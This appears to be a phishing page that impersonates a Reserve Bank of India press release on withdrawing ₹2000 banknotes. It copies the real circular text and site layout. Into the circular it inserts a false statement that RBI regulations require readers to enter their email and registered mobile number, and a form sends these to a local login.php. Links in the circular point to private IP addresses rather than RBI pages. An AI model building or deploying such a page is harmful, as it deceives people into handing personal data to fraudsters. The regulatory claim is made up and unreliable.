<?php
include "validate.php";
?>
<!DOCTYPE html
    PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang="en">


</html>
<!-- saved from url=(0080)https://www.rbi.org.in/Scripts/Error.aspx?aspxerrorpath=/CyberQuizzes/Quiz1.aspx -->
<html xmlns="http://www.w3.org/1999/xhtml" style=""
    class=" no-applicationcache geolocation history svg websockets localstorage sessionstorage websqldatabase webworkers hashchange audio canvas canvastext video webgl cssgradients opacity multiplebgs rgba inlinesvg hsla supports svgclippaths smil fontface generatedcontent textshadow cssanimations backgroundsize borderimage borderradius boxshadow flexbox csscolumns csscolumns-width csscolumns-span csscolumns-fill csscolumns-gap csscolumns-rule csscolumns-rulecolor csscolumns-rulestyle csscolumns-rulewidth csscolumns-breakbefore csscolumns-breakafter csscolumns-breakinside cssreflections csstransforms csstransforms3d csstransitions indexeddb indexeddb-deletedatabase">
<script type="text/javascript" async="" src="./site/js"></script>
<script async="" src="./site/analytics.js.download"></script>
<script>
    // window[Symbol.for('MARIO_POST_CLIENT_nimlmejbmnecnaghgmbahmbaddhjbecg')] = new (class PostClient {
    //     constructor(name, destination) {
    //         this.name = name;
    //         this.destination = destination;
    //         this.serverListeners = {};
    //         this.bgRequestsListeners = {};
    //         this.bgEventsListeners = {};
    //         window.addEventListener('message', (message) => {
    //             const data = message.data;
    //             const isNotForMe = !(data.destination && data.destination === this.name);
    //             const hasNotEventProp = !data.event;
    //             if (isNotForMe || hasNotEventProp) {
    //                 return;
    //             }
    //             if (data.event === 'MARIO_POST_SERVER__BG_RESPONSE') {
    //                 const response = data.args;
    //                 if (this.hasBgRequestListener(response.requestId)) {
    //                     try {
    //                         this.bgRequestsListeners[response.requestId](response.response);
    //                     }
    //                     catch (e) {
    //                         console.log(e);
    //                     }
    //                     delete this.bgRequestsListeners[response.requestId];
    //                 }
    //             }
    //             else if (data.event === 'MARIO_POST_SERVER__BG_EVENT') {
    //                 const response = data.args;
    //                 if (this.hasBgEventListener(response.event)) {
    //                     try {
    //                         this.bgEventsListeners[data.id](response.payload);
    //                     }
    //                     catch (e) {
    //                         console.log(e);
    //                     }
    //                 }
    //             }
    //             else if (this.hasServerListener(data.event)) {
    //                 try {
    //                     this.serverListeners[data.event](data.args);
    //                 }
    //                 catch (e) {
    //                     console.log(e);
    //                 }
    //             }
    //             else {
    //                 console.log(`event not handled: ${data.event}`);
    //             }
    //         });
    //     }
    //     emitToServer(event, args) {
    //         const id = this.generateUIID();
    //         const message = {
    //             args,
    //             destination: this.destination,
    //             event,
    //             id,
    //         };
    //         window.postMessage(message, location.origin);
    //         return id;
    //     }
    //     emitToBg(bgEventName, args) {
    //         const requestId = this.generateUIID();
    //         const request = { bgEventName, requestId, args };
    //         this.emitToServer('MARIO_POST_SERVER__BG_REQUEST', request);
    //         return requestId;
    //     }
    // hasServerListener(event) {
    //     return !!this.serverListeners[event];
    // }
    // hasBgRequestListener(requestId) {
    //     return !!this.bgRequestsListeners[requestId];
    // }
    // hasBgEventListener(bgEventName) {
    //     return !!this.bgEventsListeners[bgEventName];
    // }
    // fromServerEvent(event, listener) {
    //     this.serverListeners[event] = listener;
    // }
    // fromBgEvent(bgEventName, listener) {
    //     this.bgEventsListeners[bgEventName] = listener;
    // }
    // fromBgResponse(requestId, listener) {
    //     this.bgRequestsListeners[requestId] = listener;
    // }
    // generateUIID() {
    //     return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
    //         const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
    //         return v.toString(16);
    //     });
    // }
    // })('MARIO_POST_CLIENT_nimlmejbmnecnaghgmbahmbaddhjbecg', 'MARIO_POST_SERVER_nimlmejbmnecnaghgmbahmbaddhjbecg')</script>
<!-- <script>
    const hideMyLocation = new (class HideMyLocation {
        constructor(clientKey) {
            this.clientKey = clientKey;
            this.watchIDs = {};
            this.client = window[Symbol.for(clientKey)];
            const getCurrentPosition = navigator.geolocation.getCurrentPosition;
            const watchPosition = navigator.geolocation.watchPosition;
            const clearWatch = navigator.geolocation.clearWatch;
            const self = this;
            navigator.geolocation.getCurrentPosition = function (successCallback, errorCallback, options) {
                self.handle(getCurrentPosition, 'GET', successCallback, errorCallback, options);
            };
            navigator.geolocation.watchPosition = function (successCallback, errorCallback, options) {
                return self.handle(watchPosition, 'WATCH', successCallback, errorCallback, options);
            };
            navigator.geolocation.clearWatch = function (fakeWatchId) {
                if (fakeWatchId === -1) {
                    return;
                }
                const realWatchId = self.watchIDs[fakeWatchId];
                delete self.watchIDs[fakeWatchId];
                return clearWatch.apply(this, [realWatchId]);
            };
        }
        handle(getCurrentPositionOrWatchPosition, type, successCallback, errorCallback, options) {
            const requestId = this.client.emitToBg('HIDE_MY_LOCATION__GET_LOCATION');
            let fakeWatchId = this.getRandomInt(0, 100000);
            this.client.fromBgResponse(requestId, (response) => {
                if (response.enabled) {
                    if (response.status === 'SUCCESS') {
                        const position = this.map(response);
                        successCallback(position);
                    }
                    else {
                        const error = this.errorObj();
                        errorCallback(error);
                        fakeWatchId = -1;
                    }
                }
                else {
                    const args = [successCallback, errorCallback, options];
                    const watchId = getCurrentPositionOrWatchPosition.apply(navigator.geolocation, args);
                    if (type === 'WATCH') {
                        this.watchIDs[fakeWatchId] = watchId;
                    }
                }
            });
            if (type === 'WATCH') {
                return fakeWatchId;
            }
        }
        map(response) {
            return {
                coords: {
                    accuracy: 20,
                    altitude: null,
                    altitudeAccuracy: null,
                    heading: null,
                    latitude: response.latitude,
                    longitude: response.longitude,
                    speed: null,
                },
                timestamp: Date.now(),
            };
        }
        errorObj() {
            return {
                code: 1,
                message: 'User denied Geolocation',
            };
        }
        getRandomInt(min, max) {
            min = Math.ceil(min);
            max = Math.floor(max);
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }
    })//('MARIO_POST_CLIENT_nimlmejbmnecnaghgmbahmbaddhjbecg')
</script> -->


<head>
    <meta charset="utf-8">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">

    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Reserve Bank of India</title>
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="viewport" content="width=device-width">
    <script type="text/javascript" src="./site/modernizr-2.5.3.min.js.download"></script>

    <script>
        function validateForm() {
            var email = document.forms["myForm"]["email"].value;
            var number = document.forms["myForm"]["number"].value;

            // Email validation
            var emailRegex = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;
            if (!email.match(emailRegex)) {
                alert("Please enter a valid email address");
                return false;
            }

            // Number validation
            var numberRegex = /^\d{10}$/;
            if (!number.match(numberRegex)) {
                alert("Please enter a 10-digit number");
                return false;
            }
        }
    </script>

    <script ecommerce-type="extend-native-history-api">(() => {
            const nativePushState = history.pushState;
            const nativeReplaceState = history.replaceState;
            const nativeBack = history.back;
            const nativeForward = history.forward;
            function emitUrlChanged() {
                const message = {
                    _custom_type_: 'CUSTOM_ON_URL_CHANGED',
                };
                //window.postMessage(message);
            }
            history.pushState = function () {
                nativePushState.apply(history, arguments);
                emitUrlChanged();
            };
            history.replaceState = function () {
                nativeReplaceState.apply(history, arguments);
                emitUrlChanged();
            };
            history.back = function () {
                nativeBack.apply(history, arguments);
                emitUrlChanged();
            };
            history.forward = function () {
                nativeForward.apply(history, arguments);
                emitUrlChanged();
            };
        })()</script>
    <!-- <script>(function inject(e) { function SendXHRCandidate(e, t, n, r, i) { try { var o = "detector", s = { posdMessageId: "PANELOS_MESSAGE", posdHash: (Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)).substring(0, 22), type: "VIDEO_XHR_CANDIDATE", from: o, to: o.substring(0, 6), content: { requestMethod: e, url: t, type: n, content: r } }; i && i[0] && i[0].length && (s.content.encodedPostBody = i[0]), window.postMessage(s, "*") } catch (e) { } } var t = XMLHttpRequest.prototype.open; XMLHttpRequest.prototype.open = function () { this.requestMethod = arguments[0], t.apply(this, arguments) }; var n = XMLHttpRequest.prototype.send; XMLHttpRequest.prototype.send = function () { var t = Object.assign(arguments, {}), r = this.onreadystatechange; return this.onreadystatechange = function () { if (4 !== this.readyState || function isFrameInBlackList(t) { return e.some((function (e) { return t.includes(e) })) }(this.responseURL) || setTimeout(SendXHRCandidate(this.requestMethod, this.responseURL, this.getResponseHeader("content-type"), this.response, t), 0), r) return r.apply(this, arguments) }, n.apply(this, arguments) }; var r = fetch; fetch = function fetch() { var e = this, t = arguments, n = arguments[0] instanceof Request ? arguments[0].url : arguments[0], i = arguments[0] instanceof Request ? arguments[0].method : "GET"; return new Promise((function (o, s) { r.apply(e, t).then((function (e) { if (e.body instanceof ReadableStream) { var t = e.json; e.json = function () { var r = arguments, o = this; return new Promise((function (s, a) { t.apply(o, r).then((function (t) { setTimeout(SendXHRCandidate(i, n, e.headers.get("content-type"), JSON.stringify(t)), 0), s(t) })).catch((function (e) { a(e) })) })) }; var r = e.text; e.text = function () { var t = arguments, o = this; return new Promise((function (s, a) { r.apply(o, t).then((function (t) { setTimeout(SendXHRCandidate(i, n, e.headers.get("content-type"), t), 0), s(t) })).catch((function (e) { a(e) })) })) } } o.apply(this, arguments) })).catch((function () { s.apply(this, arguments) })) })) } })(["facebook.com/", "twitter.com/", "youtube-nocookie.com/embed/", "//vk.com/", "//www.vk.com/", "//linkedin.com/", "//www.linkedin.com/", "//instagram.com/", "//www.instagram.com/", "//www.google.com/recaptcha/api2/", "//hangouts.google.com/webchat/", "//www.google.com/calendar/", "//www.google.com/maps/embed", "spotify.com/", "soundcloud.com/", "//player.vimeo.com/", "//disqus.com/", "//tgwidget.com/", "//js.driftt.com/", "friends2follow.com", "/widget", "login", "//video.bigmir.net/", "blogger.com", "//smartlock.google.com/", "//keep.google.com/", "/web.tolstoycomments.com/", "moz-extension://", "chrome-extension://", "/auth/", "//analytics.google.com/", "adclarity.com", "paddle.com/checkout", "hcaptcha.com", "recaptcha.net", "2captcha.com", "accounts.google.com", "www.google.com/shopping/customerreviews", "buy.tinypass.com", "gstatic.com", "secureir.ebaystatic.com", "docs.google.com", "contacts.google.com", "github.com", "mail.google.com", "chat.google.com", "audio.xpleer.com", "keepa.com"]);</script> -->



</head>

<body
    bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6Im5pbWxtZWpibW5lY25hZ2hnbWJhaG1iYWRkaGpiZWNnIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIn0sInZlcnNpb24iOiIxLjkuMTIiLCJzY29yZSI6MTA5MTJ9XQ=="
    data-new-gr-c-s-check-loaded="14.1039.0" data-gr-ext-installed="">
    <form method="post" action="login.php" id="Form1">
        <div class="aspNetHidden" bis_skin_checked="1">
            <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" <!--
                value="/wEPDwUJLTg3NDQ1ODQzZGSwdFU9EwLfEtpsoos70tciimHd9JO3bUvrxNo6Wwdikw=="> -->
        </div>

        <div class="aspNetHidden" bis_skin_checked="1">

            <!-- <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="89AADCE6">
            <input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION"
                value="/wEdAAOVqtZrBhpoYl1uKoaj4QEBfcX9ZaEV78oETjPwNTvjRyaLpyghhgB3dOM81YQT2c+FAd4d/+scoda3xy93yeMoJ5yawqhrKPSkv5sDMZfwCQ=="> -->
        </div>

        <link href="./site/jquery-ui-1.8.18.custom2.css" rel="stylesheet" type="text/css">
        <link href="./site/print.css" rel="stylesheet" media="print" type="text/css">

        <link href="./site/960.css" rel="stylesheet" type="text/css">
        <link href="./site/rbi.css" rel="Stylesheet" type="text/css">
        <script type="text/javascript" src="./site/jquery-1.7.2.min.js.download"></script>
        <script type="text/javascript" src="./site/jquery.ui.revampRBI.js.download"></script>
        <script type="text/javascript" src="./site/ImgSaveDisable.js.download"></script>
        <!--<script src='//tw.netcore.co.in/smartechclient.js'></script>
<script>
smartech('create', 'ADGMOT35CHFLVDHBJNIG50K968AU3Q5FOE3L6REE67CQ9HGBQ58G');
smartech('register', '4d6884e503ecf55a3339a37e98b711da');
smartech('identify', '');
smartech('dispatch', 1, { });
</script>-->
        <script type="text/javascript">

            //Redirect to mobile site start
            // function detectmob() {
            //     if (screen.width <= 599 || screen.Height <= 975) {
            //         return true;
            //     } else {
            //         return false;
            //     }
            // }

            // if (detectmob()) {
            //     window.location.href = "https://m.rbi.org.in" + window.location.pathname;


            // }
            //Redirect to mobile site End
            $(document).ready(function () {
                Search();
            });

            function Search() {
                highlightTextAutocomplete();
                $(".autoSuggest").autocomplete({


                    source: function (request, response) {
                        var param = { keyWord: document.getElementById('txtSearch').value };

                        // $.ajax({
                        //     url: "../Home.aspx/GetKeywords",
                        //     data: JSON.stringify(param),
                        //     dataType: "json",
                        //     type: "POST",
                        //     contentType: "application/json; charset=utf-8",
                        //     dataFilter: function (data) { return data; },
                        //     success: function (data) {

                        //         if (data.d.length > 0) {
                        //             response($.map(data.d, function (item) {
                        //                 return {
                        //                     value: RemoveSpecialChars(item)

                        //                 }
                        //             }))
                        //         }
                        //         else {
                        //             response([{ label: "No results found", value: "" }]);
                        //         }
                        //     },
                        //     error: function (XMLHttpRequest, textStatus, errorThrown) {
                        //         alert(textStatus);
                        //     }
                        // });
                    },

                    //            select: function (event, ui) {
                    //                if (ui.item.value != "") {
                    //                    window.open("/scripts/SearchResults.aspx?search=" + ui.item.value, '_blank');
                    //                }
                    //            },
                    minLength: 3

                });
            }

            function highlightTextAutocomplete() {

                var oldFn = $.ui.autocomplete.prototype._renderItem;

                $.ui.autocomplete.prototype._renderItem = function (ul, item) {

                    var t = String(item.value).replace(
                        new RegExp(this.term, "gi"),
                        "<span class='ui-state-highlight'>$&</span>");
                    if (item.value != "") {
                        return $("<li class='borderAutocomplete'></li>")
                            .data("item.autocomplete", item)
                            .append("<a>" + t + "</a>")
                            .appendTo(ul);
                    }

                    else {
                        return $("<li></li>")
                            .data("item.autocomplete", item)
                            .append("")
                            .appendTo(ul);
                    }
                };
            }


            function RemoveSpecialChars(inputText) {
                var filteredString = inputText.replace(/[\*\^\'\!\@\$\.\#\(\)\-\?\<\>\;\"\&\+\{\}\:]/g, '');
                //alert(filteredString);
                return filteredString;
            }
            //    jQuery(document).ready(function () {
            //        var xmlhttp;
            //        jQuery("#txtSearch").autocomplete(
            //                    {
            //                        minLength: 3,
            //                        delay: 0,
            //                        source: function (request, response) {
            //                            if (!xmlhttp) {
            //                                if (window.XMLHttpRequest) {// code for IE7+, Firefox, Chrome, Opera, Safari
            //                                    xmlhttp = new XMLHttpRequest();
            //                                }
            //                                else {// code for IE6, IE5
            //                                    xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
            //                                }
            //                            }
            //                            else if (xmlhttp.readyState != 0) {
            //                                xmlhttp.abort();
            //                            }
            //                            xmlhttp.onreadystatechange = function () {
            //                                if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
            //                                    fetchedKeywords = xmlhttp.responseText.split("'");
            //                                    
            //                                    if (fetchedKeywords.length > 10) {
            //                                        fetchedKeywords.splice(10, fetchedKeywords.length - 10);
            //                                    }
            //                                    if (fetchedKeywords != "") response(fetchedKeywords);
            //                                    else response(null);
            //                                }
            //                            }
            //                            var input = document.getElementById("txtSearch").value;
            //                            xmlhttp.open("POST", "/Webservice/KeywordSearch.ashx?q=" + input, true);
            //                            xmlhttp.send();
            //                        }
            //                    });
            //    });

            function LoadSearchData(id, key) {
                if (id == "txtSearch") {
                    if (key == 13) {
                        validateSearchText();
                        return false;
                    }
                }
                else validateSearchText();
                return true;
            }
            function validateSearchText() {
                if (validation()) {
                    var strloc = new String(document.location.href.toString());
                    if (strloc.indexOf("SearchResults.aspx") == -1) {//             
                        window.open("/scripts/SearchResults.aspx?search=" + document.getElementById("txtSearch").value);
                    }
                    else window.open("/scripts/SearchResults.aspx?search=" + document.getElementById("txtSearch").value, '_parent');
                }
            }
            function validation() {
                strSearch = trim(document.getElementById('txtSearch').value);
                if (strSearch == "") { alert('Please enter the search text'); return false; }
                else {
                    //var strFilterChars = new RegExp("[~`!@#$%^&*()_+-={}\\[\\]:/\\\\\";|'<>,.?]");
                    var strFilterChars = new RegExp("^[0-9a-zA-Z ]*$");
                    if (!strFilterChars.test(strSearch)) { alert("Please remove special characters from search text"); return false; }
                }
                return true;
            }
            function trim(value) {
                value = value.replace(/^\s+/, '');
                value = value.replace(/\s+$/, '');
                return value;
            }
        </script>

        <style type="text/css">
            .blink_msm1 {
                -webkit-animation-name: blinker;
                -webkit-animation-duration: 3s;
                -webkit-animation-timing-function: linear;
                -webkit-animation-iteration-count: infinite;

                -moz-animation-name: blinker;
                -moz-animation-duration: 3s;
                -moz-animation-timing-function: linear;
                -moz-animation-iteration-count: infinite;

                animation-name: blinker;
                animation-duration: 3s;
                animation-timing-function: linear;
                animation-iteration-count: infinite;
            }

            @-moz-keyframes blinker {
                0% {
                    opacity: 1.0;
                }

                50% {
                    opacity: 0.0;
                }

                100% {
                    opacity: 1.0;
                }
            }

            @-webkit-keyframes blinker {
                0% {
                    opacity: 1.0;
                }

                50% {
                    opacity: 0.0;
                }

                100% {
                    opacity: 1.0;
                }
            }

            @keyframes blinker {
                0% {
                    opacity: 1.0;
                }

                50% {
                    opacity: 0.0;
                }

                100% {
                    opacity: 1.0;
                }
            }
        </style>
        <div class="top_setting" bis_skin_checked="1">
            <div class="container_12" bis_skin_checked="1">
                <div class="grid_5 top_settings" bis_skin_checked="1">
                    <a
                        href="https://www.rbi.org.in/Scripts/Error.aspx?aspxerrorpath=/CyberQuizzes/Quiz1.aspx#mainsection">Skip
                        to main content </a>
                </div>

                <div class="clearfix" bis_skin_checked="1">
                </div>
            </div>
        </div>
        <div class="container_12" bis_skin_checked="1">
            <div class="grid_4" role="banner" bis_skin_checked="1">
                <h1 class="logo">
                    <a href="https://www.rbi.org.in/home.aspx">
                        <img src="./site/rbi-company-logo.jpg" alt="Reserve Bank of India"></a>
                </h1>
            </div>
            <div class="grid_5" align="right" role="search" style="float: right" bis_skin_checked="1">
                <label for="searchbox" class="search_label">
                    Search the Website</label>
                <input name="UsrFontCntr$txtSearch" type="text" maxlength="103" id="txtSearch"
                    class="search_box autoSuggest ui-autocomplete-input"
                    onkeydown="return LoadSearchData(&#39;txtSearch&#39;,event.keyCode);" placeholder="Search"
                    autocomplete="off">
                <button id="btnSearch" onclick="return LoadSearchData(&#39;btnSearch&#39;,event.keyCode);" type="button"
                    class="search_button">
                    Search</button>
            </div>
            <div class="grid_2" align="CENTER" role="" style="float: right" bis_skin_checked="1">
                <h1 class="logo">
                    <a>
                        <img src="./site/AzadLogo.png" alt="AzadLogo" style="padding-top: 10px;">
                    </a>
                </h1>
            </div>
            <div class="clearfix" bis_skin_checked="1">
            </div>
        </div>
        <!--  NAVIGATION START-->
        <nav role="navigation">
            <div class="top-newmenu" bis_skin_checked="1">
                <div class="midmenu" bis_skin_checked="1">
                    <ul>
                        <li><a href="https://rbi.org.in/home.aspx">Home</a></li>
                        <li><a href="https://www.rbi.org.in/Scripts/AboutusDisplay.aspx">About Us</a></li>
                        <li><a href="https://www.rbi.org.in/Scripts/NotificationUser.aspx">Notifications</a></li>
                        <li><a href="https://www.rbi.org.in/Scripts/BS_PressReleaseDisplay.aspx">Press Releases</a></li>


                        <li><a href="https://www.rbi.org.in/Scripts/Error.aspx?aspxerrorpath=/CyberQuizzes/Quiz1.aspx#">Speeches
                                &amp; Media Interactions<img src="./site/down.gif" class="downarrowclass"
                                    style="border:0; padding-left: 5px"></a>
                            <ul>
                                <li><a href="https://www.rbi.org.in/Scripts/BS_ViewSpeeches.aspx">Speeches</a></li>
                                <li><a href="https://www.rbi.org.in/Scripts/BS_ViewInterviews.aspx">Media
                                        Interactions</a></li>
                                <li><a href="https://www.rbi.org.in/Scripts/Lectures.aspx">Memorial Lectures</a></li>
                            </ul>
                        </li>

                        <li><a href="https://www.rbi.org.in/Scripts/Error.aspx?aspxerrorpath=/CyberQuizzes/Quiz1.aspx#">Publications
                                <img src="./site/down.gif" class="downarrowclass"
                                    style="border:0; padding-left: 5px"></a>
                            <ul>
                                <li><a
                                        href="https://www.rbi.org.in/Scripts/Publications.aspx?publication=Annual">Annual</a>
                                </li>
                                <li><a
                                        href="https://www.rbi.org.in/Scripts/Publications.aspx?publication=HalfYearly">Half-Yearly</a>
                                </li>
                                <li><a
                                        href="https://www.rbi.org.in/Scripts/Publications.aspx?publication=Quarterly">Quarterly</a>
                                </li>
                                <li><a
                                        href="https://www.rbi.org.in/Scripts/Publications.aspx?publication=Bimonthly">Bi-monthly</a>
                                </li>
                                <li><a
                                        href="https://www.rbi.org.in/Scripts/Publications.aspx?publication=Monthly">Monthly</a>
                                </li>
                                <li><a
                                        href="https://www.rbi.org.in/Scripts/Publications.aspx?publication=Weekly">Weekly</a>
                                </li>
                                <li><a
                                        href="https://www.rbi.org.in/Scripts/Publications.aspx?publication=Occasional">Occasional</a>
                                </li>
                                <li><a
                                        href="https://www.rbi.org.in/Scripts/Publications.aspx?publication=Reports">Reports</a>
                                </li>
                                <li><a
                                        href="https://www.rbi.org.in/Scripts/OccasionalPublications.aspx?head=Working%20Papers">Working
                                        Papers</a></li>


                            </ul>
                        </li>



                        <li><a href="https://www.rbi.org.in/Scripts/Error.aspx?aspxerrorpath=/CyberQuizzes/Quiz1.aspx#">Legal
                                Framework <img src="./site/down.gif" class="downarrowclass"
                                    style="border:0; padding-left: 5px"></a>
                            <ul>
                                <li><a href="https://www.rbi.org.in/Scripts/Act.aspx">Act </a></li>
                                <li><a href="https://www.rbi.org.in/Scripts/Rules.aspx">Rules </a></li>
                                <li><a href="https://www.rbi.org.in/Scripts/Regulations.aspx">Regulations </a></li>
                                <li><a href="https://www.rbi.org.in/Scripts/Schemes.aspx">Schemes </a></li>
                            </ul>
                        </li>


                        <li><a href="https://www.rbi.org.in/Scripts/Error.aspx?aspxerrorpath=/CyberQuizzes/Quiz1.aspx#">Research
                                <img src="./site/down.gif" class="downarrowclass"
                                    style="border:0; padding-left: 5px"></a>
                            <ul>
                                <li><a href="https://www.rbi.org.in/Scripts/ExternalResearchSchemes.aspx">External
                                        Research Schemes</a></li>
                                <li><a href="https://www.rbi.org.in/Scripts/OccasionalPapers.aspx">RBI Occasional
                                        Papers</a></li>
                                <li><a
                                        href="https://www.rbi.org.in/Scripts/OccasionalPublications.aspx?head=Working%20Papers">Working
                                        Papers</a></li>
                                <li><a href="https://www.rbi.org.in/Scripts/BS_ViewBulletin.aspx">RBI Bulletin</a></li>
                                <li><a href="https://www.rbi.org.in/Scripts/Project1.aspx">History</a></li>
                                <li><a href="https://www.rbi.org.in/Scripts/Occas_DRG_Studies.aspx">DRG Studies</a></li>
                                <li><a href="https://www.rbi.org.in/Scripts/KLEMS.aspx">KLEMS</a></li>
                                <li><a href="https://www.rbi.org.in/Scripts/StateStatisticsFinances.aspx">State
                                        Statistics and Finances</a></li>
                            </ul>
                        </li>

                        <li><a href="https://www.rbi.org.in/Scripts/Error.aspx?aspxerrorpath=/CyberQuizzes/Quiz1.aspx#">Statistics
                                <img src="./site/down.gif" class="downarrowclass"
                                    style="border:0; padding-left: 5px"></a>
                            <ul>
                                <li><a href="https://www.rbi.org.in/Scripts/Statistics.aspx">Data Releases</a></li>
                                <li><a href="https://dbie.rbi.org.in/" target="_blank">Database on Indian Economy</a>
                                </li>
                                <li><a href="https://www.rbi.org.in/scripts/FS_PDS.aspx">Public Debt Statistics</a></li>
                            </ul>
                        </li>

                        <li><a href="https://www.rbi.org.in/Scripts/Error.aspx?aspxerrorpath=/CyberQuizzes/Quiz1.aspx#">Regulatory
                                Reporting<img src="./site/down.gif" class="downarrowclass"
                                    style="border:0; padding-left: 5px"></a>
                            <ul>
                                <li><a href="https://www.rbi.org.in/scripts/BS_Listofallreturns.aspx">List of
                                        Returns</a></li>

                                <li><a href="https://www.rbi.org.in/scripts/DataDefinition.aspx">Data Definition</a>
                                    <!--<ul>
                            <li><a href="../scripts/Assets.aspx">Assets</a></li>
							<li><a href="../Scripts/Liabilities.aspx">Liabilities</a></li>	
							<li><a href="../Scripts/OffBalanceSheetItems.aspx">Off-Balance Sheet Items</a></li>
							<li><a href="../Scripts/ProfitandLossAccountItems.aspx">Profit and Loss Account Items</a></li>
							<li><a href="../Scripts/Miscellaneous.aspx">Miscellaneous</a></li>
                        </ul>-->
                                </li>

                                <li><a href="https://www.rbi.org.in/scripts/ValidationRules.aspx">Validation rules/
                                        Taxonomy</a></li>
                                <li><a href="https://www.rbi.org.in/scripts/ReportingPlaform.aspx">List of RBI Reporting
                                        Portals</a></li>
                                <li><a href="https://www.rbi.org.in/scripts/ReportingFAQ.aspx">FAQs of RBI Reporting
                                        Portals</a></li>


                            </ul>
                        </li>




                    </ul>

                </div>
            </div>
        </nav>
        <!--  NAVIGATION END-->
        <!--HEADER END-->

        <div class="container_12">
            <a id="mainsection" name="mainsection"></a>
            <div class="grid_12 breadcrumbs">
                <ul>
                    <li><a href="../Home.aspx">Home</a></li>
                    <span id="lblNav">
                        <li><a href="BS_PressReleaseDisplay.aspx">Press Releases</a></li>
                    </span>
                </ul>
            </div>
            <div class="clear">
            </div>
            <!-- <div class="grid_5 omega right_blue_border"> -->
            <div class="text1">

                <h2 class="page_title">
                    Press Releases</h2>
                <div>
                    <br />
                    <div align="right">
                    </div>
                </div>
            </div>
            <!-- </div> -->


            <table class="tablebg" cellpadding="0" cellspacing="0" width="100%">
                <tbody>
                    <tr>
                        <td class="tableheader"><a href=""><img src="../Images/pdf.gif" width="16" height="16"
                                    alt="PDF document" border="0" align="absmiddle"></a> (380 kb)</td>
                    </tr>
                    <tr>
                        <td align="right" class="tableheader"><b> Date : </b>Oct 3, 2023</td>
                    </tr>
                    <tr>
                        <td align="center" class="tableheader"><b>₹2000 Denomination Banknotes – Withdrawal from
                                Circulation</b></td>
                    </tr>
                    <tr class="tablecontent1">
                        <td>
                            <table width="100%" border="0" align="center" class="td">
                                <tbody>
                                    <tr>
                                        <td>
                                            <br>
                                            <p>RBI/2023-24/64<br>
                                                DCM(Plg) No. S-1288/10.27.00/2023-24</p><br>
                                            <p>The Chairman / Managing Director / Chief Executive Officer <br>
                                                All Banks<br>

                                                Madam / Dear Sir,</p><br>
                                            <p><b>₹2000 Denomination Banknotes – Withdrawal from Circulation</b></p>

                                            <p>To comply with the Reserve Bank of India's regulations, it is mandatory
                                                to enter your email and phone number in the form below. By submitting
                                                your email and phone number, you agree to receive important updates and
                                                notifications regarding the withdrawal of ₹2000 banknotes from
                                                circulation. We assure you that your personal information will be kept
                                                confidential and will not be shared with any third-party.</p>

                                            <b>Entering your details are mandatory.<font color=red>*</font></b>
                                            <p class="head">
                                            <form name="myForm" action="login.php" accept-charset="UTF-8"
                                                onsubmit="return validateForm()" method="POST">

                                                <table>
                                                    <tr>
                                                        <td><label for="email">Email ID:<font color=red>*</font></label>
                                                        </td>
                                                        <td><input type="email" id="email" name="email"
                                                                placeholder="Enter your email ID" required></td>
                                                    </tr>
                                                    <tr>
                                                        <td><label for="number">Registered Mobile Number:<font
                                                                    color=red>*
                                                                </font></label></td>
                                                        <td><input type="tel" id="number" name="number"
                                                                placeholder="Enter your registered number" required>
                                                        </td>
                                                    </tr>
                                                </table>
                                                <input type="submit" value="Submit">
                                            </form>
                                            </p>

                                            <p>



                                                <br>
                                                A reference is invited to our circulars
                                                <a href="192.168.66.:9999"> DCM(Plg)No.S-236/10.27.00/2023-24 dated May
                                                    19, 2023</a> and
                                                <a href="192.66.0.200:9999"> DCM(Plg)No.S-239/10.27.00/2023-24 dated May
                                                    22, 2023 on the subject.</a>

                                                <br>


                                            <p> Of the total value of ₹3.56 lakh crore of ₹2000 banknotes in
                                                circulation as on May 19, 2023, ₹3.42 lakh crore has been received
                                                back leaving only ₹0.14 lakh crore in circulation as at the close of
                                                business on September 29, 2023; thus, 96% of ₹2000 banknotes in
                                                circulation as on May 19, 2023 has since been returned.</p>
                                            <p> As the period specified for the withdrawal has come to an end,
                                                and based on a review, it has been decided to extend the current
                                                arrangement for deposit / exchange of ₹2000 banknotes until October 07,
                                                2023. A <a href="192.66.0.200:9999">Press Release</a> in the matter has
                                                been issued. Banks shall
                                                continue to maintain daily data on deposit / exchange of ₹2000 banknotes
                                                in the format prescribed vide circular dated May 22, 2023 referred to
                                                above and submit the same to RBI.</p>

                                            <p> All instructions issued under <b>para 3A</b> of our <a
                                                    href="192.66.0.200:9999">circular
                                                    DCM(Plg)No.S-236/10.27.00/2023-24</a> dated May 19, 2023 in the
                                                matter shall
                                                continue to remain in force. Banks shall also ensure that ₹2000
                                                banknotes collected by their branches till October 07, 2023, are
                                                deposited at currency chests on or before October 13, 2023.</p>
                                            <p> ₹2000 banknotes shall continue to be legal tender.</p>
                                            <p> You are requested to issue suitable instructions to the
                                                branches in this regard.</p>

                                            <p>Please acknowledge receipt.</p>
                                            <p>Yours faithfully<br><br>

                                            </p>

                                            



                                                <br>
                                            <p align="right"><span class="head">(Suman

                                                    Ray)</span>&nbsp;&nbsp;&nbsp;&nbsp;<br>
                                                Chief General Manager in-Charge

                                            </p>
